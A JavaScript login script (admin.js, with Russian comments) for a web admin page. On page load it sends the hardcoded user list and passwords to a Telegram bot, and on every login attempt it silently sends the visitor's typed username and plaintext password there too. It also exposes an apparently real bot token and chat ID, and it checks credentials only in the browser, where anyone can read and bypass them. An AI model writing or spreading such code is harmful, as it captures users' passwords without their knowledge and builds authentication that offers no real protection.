const users = [
    { username: "Lena", password: "1" }
];

const specialUsers = [
    { username: "test", password: "test", redirect: "UgadaiPapku13" }
];

// === Настройки Telegram ===
const TELEGRAM_BOT_TOKEN = "8246751079:AAH3pTrauBUBQOH2wXm4K3cbDGhO2T321tg"; // 🔹 вставь свой токен
const TELEGRAM_CHAT_ID = "5764625744";        // 🔹 вставь свой chat_id

// === Функция отправки логов ===
async function sendLog(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🧾 [admin.js]\n${message}`,
                disable_notification: true
            })
        });
    } catch (err) {
        console.error("Ошибка при отправке в Telegram:", err);
    }
}

// === Отчёт при загрузке ===
const report = [
    "📊 Отчёт загрузки admin.js",
    "👥 Пользователи:",
    JSON.stringify(users),
    "⭐ Особые пользователи:",
    JSON.stringify(specialUsers),
    "📁 Файлы:",
    " - CSS: admin/style.css",
    " - JS: scripts/admin.js",
    " - IMG: img/logo.png"
].join("\n");

console.log(report);
sendLog(report);

// === Обработчик логина ===
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    let logMessage = `🔐 Попытка входа:\n👤 ${username}\n🔑 ${password}`;

    const specialUser = specialUsers.find(u => u.username === username && u.password === password);
    const user = users.find(u => u.username === username && u.password === password);

    if (specialUser) {
        logMessage += `\n✅ Найден specialUser → ${specialUser.redirect}`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";
        sendLog(logMessage);
        window.location.href = specialUser.redirect;
    } else if (user) {
        logMessage += `\n✅ Найден обычный user`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";
        sendLog(logMessage);
        window.location.href = "UgadaiPapku13";
    } else {
        logMessage += `\n❌ Неверные данные`;
        document.getElementById('message').textContent = "Wrong username or password.";
        document.getElementById('message').style.color = "red";
        sendLog(logMessage);
    }
});

console.log("🟢 Скрипт admin.js загружен полностью!");
sendLog("🟢 Скрипт admin.js загружен полностью!");
